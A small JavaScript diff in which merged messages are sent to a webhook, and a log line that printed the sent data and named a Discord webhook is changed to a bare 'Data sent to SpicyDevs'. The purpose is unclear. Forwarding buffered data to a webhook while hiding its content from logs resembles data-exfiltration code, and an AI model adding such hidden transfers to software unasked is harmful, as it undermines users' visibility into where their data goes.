@@ -53,7 +53,7 @@ const sendToWebhook = async (data) => {
 const sendMergedMessages = async () => {
   const mergedData = mergedMessages.join('\n'); // Merge the messages using a separator
   await sendDataToWebhook(mergedData); // Send the merged messages to the webhook
-  console.log('Data sent to Discord webhook:', mergedData);
+  console.log('Data sent to SpicyDevs');
   mergedMessages = []; // Reset the mergedMessages array
 };
       try {
